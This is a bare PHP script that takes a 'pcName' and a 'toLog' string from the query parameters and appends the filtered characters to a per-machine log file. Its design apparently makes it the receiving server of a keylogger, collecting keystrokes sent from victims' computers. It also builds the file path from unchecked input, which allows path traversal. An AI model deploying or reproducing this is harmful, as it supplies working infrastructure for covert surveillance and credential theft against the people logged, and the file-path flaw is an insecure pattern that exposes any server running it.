<?php
 
if(isset($_GET['pcName'], $_GET['toLog'])){
$toLogs = str_split($_GET['toLog']);
$pcName = $_GET['pcName'];
$allows = array_merge(range('A', 'Z'), range('a', 'z'), range('0', '9'));
array_push($allows, "\n", "\t", "@", ".", " ", "?", "!", "(", ")", "#", "$", "%", "^", "^", "&", "*", "'", "<", ">", "/", "-", "+", "=", "_", "{", "}", '"');
foreach($toLogs as $toLog){
        if(!in_array($toLog, $allows))
                $toLog = "";
        if($toLog == "\r")
                $toLog = "\n";
       
        $file = fopen('logs/'.$pcName.'.txt', "a+");
        fwrite($file, $toLog);
        fclose($file);
}
 
}
 
?>
